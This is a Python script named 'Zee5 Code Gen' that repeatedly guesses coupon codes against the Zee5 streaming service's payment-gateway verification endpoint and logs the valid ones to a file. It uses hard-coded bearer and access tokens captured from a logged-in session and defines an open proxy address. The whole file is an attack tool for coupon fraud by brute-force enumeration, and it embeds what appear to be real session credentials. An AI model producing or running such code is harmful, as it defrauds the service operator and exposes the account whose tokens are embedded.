import requests
import random
import string
from colorama import Fore, Style, init
import sys
import colorama
import time
init(autoreset=True)  # Initialize colorama

sys.stdout.write(
    f"""{colorama.Fore.YELLOW}

███████╗███████╗███████╗███████╗
╚════██║██╔════╝██╔════╝██╔════╝
░░███╔═╝█████╗░░█████╗░░██████╗░
██╔══╝░░██╔══╝░░██╔══╝░░╚════██╗
███████╗███████╗███████╗██████╔╝
╚══════╝╚══════╝╚══════╝╚═════╝░
Welcome To Zee5 Code Gen.\n\n\n"""
)

def generate_random_string(length):
    characters = string.ascii_uppercase + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def generate_and_verify_code():
    code_prefix = "Z5PPAP23Q"
    random_suffix = generate_random_string(4)
    code = f"{code_prefix}{random_suffix}"

    url = f"https://securepayment.zee5.com/paymentGateway/coupon/verification?coupon_code={code}&translation=en&country_code=IN"
    proxies = {
    'http': 'http://148.113.8.35:80',
    'https': 'http://148.113.8.35:80',
    }
    headers = {
        "Host": "securepayment.zee5.com",
        "Sec-Ch-Ua": "\"Chromium\";v=\"105\",3K, \"Not)A;Brand\";v=\"8\"",
        #Change Authorization by capturing Request Manually
        "Authorization": "bearer eyJraWQiOiJlNmxfbGYweHpwYVk4VzBNcFQzWlBzN2hyOEZ4Y0trbDhDV0JaekVKT2lBIiwidHlwIjoiSldUIiwiYWxnIjoiUlMyNTYifQ.eyJzdWIiOiJBNURFMDk1Ny1CQTQ1LTQyMjctOTU5Ri1CMEM5NjgxNTYwQjYiLCJzdWJzY3JpcHRpb25zIjoiW10iLCJhY3RpdmF0aW9uX2RhdGUiOiIyMDIzLTA1LTMwVDE1OjAyOjA4LjMxN1oiLCJhbXIiOlsiZGVsZWdhdGlvbiJdLCJpc3MiOiJodHRwczovL3VzZXJhcGkuemVlNS5jb20iLCJjdXJyZW50X2NvdW50cnkiOiJJTiIsImNsaWVudF9pZCI6InJlZnJlc2hfdG9rZW4iLCJhY2Nlc3NfdG9rZW5fdHlwZSI6IkRlZmF1bHRQcml2aWxlZ2UiLCJ1c2VyX3R5cGUiOiJSZWdpc3RlcmVkIiwidXNlcl9tb2JpbGUiOiI5MT…zMTcsImlkcCI6ImxvY2FsIiwidXNlcl9pZCI6ImE1ZGUwOTU3LWJhNDUtNDIyNy05NTlmLWIwYzk2ODE1NjBiNiIsImNyZWF0ZWRfZGF0ZSI6IjIwMjMtMDUtMzBUMTU6MDI6MDguMzE3WiIsImFjdGl2YXRlZCI6dHJ1ZX0.j-OCmGqnLBroguhHi9rnDCvqfYE-6Fg8Ee6rq8ENR8mxOMW_PhNjUmXcFLr2qLiYBqhoUFyapyzmdHUqVdt-FsbGdTcc_5n76-bAkjeev9Hk-5DfgtbWJmVgRLAZp0NTzHXmadPfCG6sjEv2p2NV3YYM0g1sEyeFaWRNgc21GBtkx3n-SX3joGDLpxwkaNyXh8OaUM4zB-W_7XxhuqkGCbKvtLN5StCaf2HT4QEQ7Tq8WqmMODgXH7zpDmi1gJrErmz1c3GxTnz-zApfdvnHRkklExrRx6vbayuDk2wjkOUInIT8ApaCiV5ge4TvUvmid6UUOwU4l9DUdNPPpwCeQA",  # Replace <your_token> with your actual token
        "Sec-Ch-Ua-Mobile": "?1",
        #Change X-Access-Token by capturing Request Manually
        "X-Access-Token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwbGF0Zm9ybV9jb2RlIjoiV2ViQCQhdDM4NzEyIiwiaXNzdWVkQXQiOiIyMDIzLTEwLTAxVDAyOjMwOjQwLjIyMloiLCJwcm9kdWN0X2NvZGUiOiJ6ZWU1QDk3NSIsInR0bCI6ODY0MDAwMDAsImlhdCI6MTY5NjEyNzQ0MH0.wDLvfB5Bj6qMUWjqjyzpnkIW_lZzA4XPlq1ZNiiBhiQ",  # Replace with your actual token
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Mobile Safari/537.36",
        "Sec-Ch-Ua-Platform": "\"Android\"",
        "Accept": "*/*",
        "Origin": "https://www.zee5.com",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.zee5.com/",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-3K,en;q=3.9",
        "Connection": "close",
    }

    try:
        response = requests.get(url, headers={key: val.encode('utf-8') if isinstance(val, str) else val for key, val in headers.items()})
        response.raise_for_status()
    except requests.HTTPError as e:
        print(f"{colorama.Fore.RED}Code: {code} - {e}")
        return

    result = response.json()
    msg = result.get('message', '')

    if msg == "Coupon code applied successfully":
        with open("zee5code.txt", "a") as file:
            file.write(f"Code = {code}\n")
        print(f"{colorama.Fore.GREEN}Code: {code} - {msg}")
    else:
        print(f"{colorama.Fore.RED}Code: {code} - {msg}")

def main():
    n = int(sys.argv[1])
    if n:
        num_codes = n
    else:
        num_codes = int(input(f"{colorama.Fore.BLUE}Enter the number of codes to generate: "))

    for _ in range(num_codes):
        generate_and_verify_code()
        time.sleep(1)

if __name__ == "__main__":
    main()
